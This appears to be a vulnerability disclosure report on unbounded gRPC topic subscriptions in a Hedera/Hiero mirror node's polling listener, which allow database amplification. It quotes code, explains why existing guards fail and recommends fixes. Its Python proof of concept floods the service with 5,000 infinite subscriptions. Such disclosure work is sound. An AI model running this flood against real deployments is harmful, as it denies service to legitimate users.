### Title
Unbounded Concurrent Subscriptions in `PollingTopicListener.listen()` Enable DB-Amplification DoS

### Summary
`PollingTopicListener.listen()` creates a fully independent database polling loop for every subscriber with no per-IP, per-topic, or global subscription count enforcement. An unprivileged attacker can open an arbitrary number of gRPC connections and subscribe to the same topic thousands of times, causing the database to serve identical large result sets to every concurrent poller simultaneously. The only per-connection guard (`maxConcurrentCallsPerConnection = 5`) is trivially bypassed by opening more connections.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` (lines 34–49) creates a brand-new `PollingContext` and a `Flux.defer(() -> poll(context))` chain for every single invocation:

```java
// PollingTopicListener.java:34-49
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    PollingContext context = new PollingContext(filter);          // new state per subscriber
    Duration interval = listenerProperties.getInterval();        // default 500ms

    return Flux.defer(() -> poll(context))
            .delaySubscription(interval, scheduler)
            .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)         // infinite loop
                    .jitter(0.1)
                    .withFixedDelay(interval)
                    .withScheduler(scheduler))
            ...
}
```

`poll()` (lines 51–62) issues a fresh `topicMessageRepository.findByFilter(newFilter)` to the database on every tick, with `pageSize` up to `listenerProperties.getMaxPageSize()` (default **5000 rows**):

```java
// PollingTopicListener.java:57,61
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

**Root cause — failed assumption:** The design assumes a small, bounded number of concurrent subscribers. There is no mechanism to enforce that assumption.

**Why existing checks are insufficient:**

| Check | Location | Why it fails |
|---|---|---|
| `maxConcurrentCallsPerConnection = 5` | `NettyProperties.java:14`, applied in `GrpcConfiguration.java:33` | Per-connection only; attacker opens N connections → N×5 concurrent streams |
| `subscriberCount` AtomicLong | `TopicMessageServiceImpl.java:48,89-90` | Metrics gauge only — never compared against a limit, never rejects a subscription |
| No per-IP connection limit | `GrpcConfiguration.java:27-35` | Only `maxConcurrentCallsPerConnection` is configured; no `maxConnectionsPerIp` or equivalent |
| No throttle in grpc module | (absent) | The `ThrottleConfiguration`/`ThrottleManagerImpl` exists only in the `web3` module |

**Exploit flow:**

1. Attacker opens 1 000 TCP connections to port 5600 (no IP-level connection cap).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` gRPC streaming calls targeting the same high-traffic topic with `startTime = 0` (no `endTime`, no `limit`).
3. `ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `topicListener.listen()` → `PollingTopicListener.listen()` — a new independent polling loop starts for each of the 5 000 subscriptions.
4. Every 500 ms each loop calls `topicMessageRepository.findByFilter()`, potentially returning 5 000 rows.
5. Total DB throughput: **5 000 subscriptions × 2 polls/s × 5 000 rows = 50 million rows/second** from a single attacker machine.

### Impact Explanation

When the listener type is `POLL` (`hiero.mirror.grpc.listener.type=POLL`), every subscriber is a direct, independent database client. The database connection pool is exhausted, query latency spikes for all users, and the mirror node becomes unavailable. Because the polling is infinite (`Long.MAX_VALUE` repeats) and each subscription holds a scheduler thread on `Schedulers.boundedElastic()`, thread pool exhaustion compounds the database exhaustion. The attack requires no authentication, no special topic permissions, and no knowledge beyond a valid topic ID.

### Likelihood Explanation

Any unprivileged network client can reach port 5600. Opening thousands of gRPC HTTP/2 connections is trivial with standard tooling (e.g., `ghz`, a custom gRPC client, or even the Hedera SDK). The attacker needs only one valid `topicId` (all topic IDs are public on-chain). The attack is repeatable, requires no state, and can be sustained indefinitely. A single commodity machine with a 1 Gbps link can sustain thousands of concurrent HTTP/2 streams.

### Recommendation

1. **Enforce a global subscriber cap** — compare `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` and return `RESOURCE_EXHAUSTED` if exceeded.
2. **Add per-IP concurrent-subscription limiting** — implement a gRPC `ServerInterceptor` that tracks active streaming calls per remote IP and rejects new ones above a threshold.
3. **Prefer `SHARED_POLL` or `REDIS` for production** — `SharedPollingTopicListener` issues a single DB query shared across all subscribers (via `.share()`), eliminating the N-subscriber DB amplification entirely. Document that `POLL` mode is unsafe for public-facing deployments.
4. **Cap total connections per IP** at the Netty/load-balancer layer (`maxConnectionsPerIp` or an equivalent ingress rule).

### Proof of Concept

```python
import grpc
import threading
from com.hedera.hashgraph.sdk.proto import consensus_service_pb2_grpc, consensus_topic_query_pb2
from google.protobuf.timestamp_pb2 import Timestamp

TARGET = "mirror-node-host:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1  # any valid topic

def flood_subscribe():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_topic_query_pb2.ConsensusTopicQuery(
        topicID=...,
        consensusStartTime=Timestamp(seconds=0, nanos=0),
        # no endTime, no limit → infinite stream
    )
    # 5 concurrent streams per connection (maxConcurrentCallsPerConnection default)
    streams = [stub.subscribeTopic(query) for _ in range(5)]
    for s in streams:
        for _ in s:  # drain indefinitely
            pass

threads = [threading.Thread(target=flood_subscribe) for _ in range(1000)]
for t in threads:
    t.start()
# Result: 5000 independent DB pollers, each querying up to 5000 rows every 500ms
```

**Expected result:** Database CPU/IO saturates within seconds; legitimate subscribers receive no messages or extreme latency; mirror node gRPC service becomes unresponsive.
